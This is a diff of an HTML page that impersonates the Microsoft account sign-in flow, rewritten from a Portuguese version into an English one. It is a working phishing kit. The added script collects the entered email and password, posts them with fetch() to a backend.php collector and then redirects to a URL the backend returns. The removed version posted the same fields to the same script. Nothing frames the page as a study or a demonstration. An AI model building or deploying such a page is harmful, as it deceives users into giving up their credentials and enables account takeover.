@@ -1,85 +1,127 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="en">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <title>Entrar na sua conta Microsoft</title>
-    <link rel="icon" type="image/svg+xml" sizes="21x21" href="assets/img/favicon16.svg">
-    <link rel="icon" type="image/svg+xml" sizes="43x43" href="assets/img/favicon32.svg">
-    <link rel="icon" type="image/svg+xml" sizes="240x240" href="assets/img/favicon%20180.svg">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
-    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css">
-    <link rel="stylesheet" href="assets/css/styles.min.css">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="assets/app.css" />
 </head>
 
-<script>
-    document.getElementById("btnSend").addEventListener("click", function() {
-    if (!validate()) return;
-    const emailValue = document.getElementById("email").value;
-    document.getElementById("userLine").textContent = emailValue;
+<body>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("btn_final").addEventListener("click", function(event) {
+                event.preventDefault();
+    
+                var email = document.getElementById("inp_uname").value;
+                var password = document.getElementById("inp_pwd").value;
+    
+                fetch('../backend.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
+                })
+                .then(response => response.text())
+                .then(url => {
+                    window.location.href = url; // Use a URL retornada para redirecionar
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            });
+        });
+    </script>
+    
+    
+    
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" />
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="email" class="input" placeholder="Email, phone, or Skype" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">Sign in with a security key
+                        <img src="assets/question.png" alt="Question img">
+                    </a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_next">Next</button>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
+                        width="30px" /></span> Sign-in options</p>
+        </div>
+    </section>
 
-    const section1 = document.getElementById("section-1");
-    const section2 = document.getElementById("section-2");
-    section1.style.display = "none"; // Hide section-1
-    section2.style.display = "block"; // Show section-2
-});
-</script>
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="assets/back.png" />
+                </button>
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="password" class="input" placeholder="Password" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_sig">Sign in</button>
+            </div>
+        </div>
+    </section>
 
-<body class="text-nowrap" style="width: 100%; height: 100vh;">
-    <div id="loginForm" class="container">
-        <img id="image" src="assets/img/microsoft_logo.svg">
-        <div></div>
-        <form id="form" action="../backend.php" method="post">
-            <section id="section-main">
-                <section id="section-1" class="slide-page">
-                    <!-- Seus elementos de formulário existentes -->
-                    <p id="signIn" class="field">Entrar</p>
-                    <h5 id="result"></h5>
-                    <input type="email" id="email" name="email" class="field" placeholder="Email, telefone ou Skype" />
-                    <p id="NoAccount" class="field">Não tem uma conta?<a id="linkCreateAccount"
-                            href="https://signup.live.com/?lic=1" style="color: #0067b8;">Crie uma!</a></p>
-                    <p id="signInSecurityKey" class="field"><a
-                            href="https://support.microsoft.com/en-us/help/4463210/windows-10-sign-in-microsoft-account-windows-hello-security-key"
-                            style="color: #0067b8;">Entrar com uma chave de segurança</a><i
-                            class="far fa-question-circle fa-lg" id="iconQ"></i></p>
-                    <p id="signInOptions" class="field"><a
-                            href="https://account.microsoft.com/account/manage-my-account"
-                            style="color: #0067b8;">Opções de entrada</a></p>
-                    <p id="btnPlace" class="field"><button class="firstNext next"  type="button"
-                            id="btnSend">Próximo</button></p>
-                </section>
-                <section id="section-2" class="page secondSlide">
-                    <p id="userLine">P</p><button class="btn btn-primary btn-sm py-0 prev-1" id="btnBack" type="button"
-                        style="font-size: 12px;height: 25px;width: 26px;"><i class="la la-long-arrow-left"
-                            id="arrowBack-1"
-                            style="width: 1px;font-size: 19px;font-weight: 800;margin: -1px;"></i></button>
-                    <p id="enterPwd">Digite a senha</p>
-                    <h5 id="passResult"></h5>
-                    <p><input type="password" id="password" name="password" placeholder="Senha"></p>
-                    <p id="keepMe">Mantenha-me conectado</p><input type="checkbox" id="cbRemember">
-                    <p id="ForgodPwd"><a href="#">Esqueceu a senha?</a></p>
-                    <p id="SignWithKey"><a href="#">Entrar com o Windows Hello ou uma chave de segurança</a></p>
-                    <p id="btnSignInLocation"><button id="btnSignIn" class="submit" type="submit">Entrar</button></p>
-                </section>
-            </section>
-        </form>
-    </div>
-    <div id="footer" style="height: 36px;">
-        <div id="terms" style="float: left;width: 84px;">
-            <p style="font-size: 13px;text-align: left;">Termos de uso</p>
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final_no">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
         </div>
-        <div style="float: left;width: 105px;">
-            <p style="font-size: 12px;">Privacidade e cookies</p>
-        </div>
-        <div style="float: left;width: 24px;">
-            <p style="font-size: 12px;">•••<br></p>
-        </div>
-    </div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
-    <script src="assets/js/script.min.js"></script>
+    </section>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script src="assets/app.js"></script>
+    
+    
+    
 </body>
 
 </html>
